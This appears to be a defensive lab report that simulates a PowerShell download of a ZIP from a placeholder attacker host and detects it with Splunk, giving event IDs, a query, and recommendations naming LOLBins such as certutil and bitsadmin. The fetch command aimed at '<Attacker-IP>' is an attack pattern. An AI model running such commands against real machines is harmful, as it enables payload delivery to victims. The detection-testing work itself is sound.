🔍 Suspicious File Download & Execution Simulation Report

📌 Use Case

MITRE ATT\&CK Technique:

* Initial Access & Execution

  * `T1204.002` – User Execution: Malicious File

---

📝 Scenario Summary

This simulation replicates a common initial access vector where an attacker uses a legitimate tool such as PowerShell to download and execute a malicious ZIP file. The scenario aims to test the visibility of suspicious download activity and script execution within a Windows environment using PowerShell and detect them via Splunk.

---

🧪 Attack Steps

Tools/Commands Used:

On Attacker Machine (Kali Linux):

```bash
echo "malicious payload inside" > fake_payload.txt
zip malicious.zip fake_payload.txt
python3 -m http.server 8080
```

On Victim Machine (Windows):

```powershell
powershell -Command "Invoke-WebRequest -Uri http://<Attacker-IP>:8080/malicious.zip -OutFile C:\Users\Public\malicious.zip"
```

* This uses PowerShell's `Invoke-WebRequest` to download a ZIP archive containing a fake payload.
* The file is dropped in a public user directory for potential execution.

---

📊 Event IDs & Data Sources

| Source                     | Event ID | Description                     |
| -------------------------- | -------- | ------------------------------- |
| Windows Security Logs      | 4688     | Process creation                |
| Sysmon (if enabled)        | 1        | Detailed process monitoring     |
| PowerShell Operational Log | 4104     | PowerShell script block logging |

---

🔎 Detection Logic (Splunk SPL)

```spl
index=* EventCode=4104
| table _time, host, source, sourcetype, Message
| sort -_time
```


---

🔐 Recommendations

* Block download and execution of files from untrusted sources using PowerShell.
* Enable and monitor ScriptBlockLogging and ModuleLogging via GPO.
* Restrict PowerShell usage to authorized users.
* Alert on use of LOLBins like `Invoke-WebRequest`, `certutil.exe`, or `bitsadmin.exe`.

---

🚨 Status

* [x] Detection Tested
* [x] Alert Triggered

---
